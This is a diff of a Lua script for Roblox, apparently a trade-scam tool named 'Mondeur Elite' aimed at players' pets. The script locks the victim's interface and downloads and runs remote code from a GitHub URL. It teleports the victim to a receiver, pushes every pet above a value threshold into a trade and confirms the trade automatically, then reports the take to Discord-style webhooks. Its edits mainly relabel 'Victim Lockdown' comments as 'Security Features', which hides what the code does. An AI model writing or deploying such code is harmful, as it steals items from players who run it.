@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v15.0 - THE FINAL BUILD ]] --
+-- [[ MONDEUR ELITE v15.1 - DGRBGG BUILD ]] --
 if _G.__Ran then return end
 _G.__Ran = true
 
@@ -12,7 +12,7 @@ local LocalPlayer = Players.LocalPlayer
 local API = ReplicatedStorage:WaitForChild("API")
 local TradeAPI = API:WaitForChild("TradeAPI")
 
--- 1. FEATURE: Dualhook Logging
+-- 1. Dualhook Logging Logic
 local function DualLog(petName, val)
     local payload = HttpService:JSONEncode({
         ["embeds"] = {{
@@ -23,11 +23,11 @@ local function DualLog(petName, val)
                 {["name"] = "Value", ["value"] = tostring(val), ["inline"] = true}
             },
             ["color"] = 0xff0000,
-            ["footer"] = {["text"] = "Mondeur Elite v15.0"}
+            ["footer"] = {["text"] = "Mondeur Elite v15.1"}
         }}
     })
 
-    local urls = {getgenv().WEBHOOK, "YOUR_BOT_WEBHOOK_HERE"} -- Add your bot link here
+    local urls = {getgenv().WEBHOOK, "YOUR_BOT_WEBHOOK_HERE"} 
     for _, url in pairs(urls) do
         if url and url ~= "" then
             task.spawn(function()
@@ -39,16 +39,16 @@ local function DualLog(petName, val)
     end
 end
 
--- 2. FEATURE: Victim Lockdown & UI Disable
+-- 2. Lockdown & Security Features
 local function Lockdown(receiverName)
     pcall(function()
-        -- Disable Leave Button/Leaderboard
+        -- Disable Core UI
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         
         -- Load Loading Screen UI
         loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
         
-        -- Unseat & Teleport to Receiver
+        -- Physical Lockdown
         local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
         local target = Players[receiverName].Character:FindFirstChild("HumanoidRootPart")
@@ -62,9 +62,8 @@ local function Lockdown(receiverName)
     end)
 end
 
--- 3. FEATURE: Ultra-Fast Trade Logic
+-- 3. Ultra-Fast Trading Logic (Using ClientData)
 local function executeTrade(targetPlayer)
-    -- Corrected Data Path (No Infinite Yield)
     local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
     local inventory = ClientData.get_data().inventory
     
@@ -72,9 +71,9 @@ local function executeTrade(targetPlayer)
         Lockdown(targetPlayer.Name)
 
         for _, petData in pairs(inventory.pets) do
+            -- Uses your Arfud Database
             local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
             
-            -- Add to trade if above threshold
             if val >= (getgenv().THRESHOLD or 0) then
                 task.spawn(function()
                     TradeAPI:WaitForChild("AddItemToTrade"):FireServer(petData.unique)
@@ -83,7 +82,7 @@ local function executeTrade(targetPlayer)
             end
         end
         
-        -- Auto Accept & Confirm
+        -- Accept & Confirm Sequence
         task.wait(0.3)
         TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
         task.wait(0.2)
@@ -91,7 +90,7 @@ local function executeTrade(targetPlayer)
     end
 end
 
--- 4. Main Loop & Admin Priority
+-- 4. Main Execution Loop
 task.spawn(function()
     while task.wait(0.5) do
         local admins = {"CREOLEO23", "cfpaj67", "Hisokarah", "2ndcfpaj67", "sofiqmnz"}
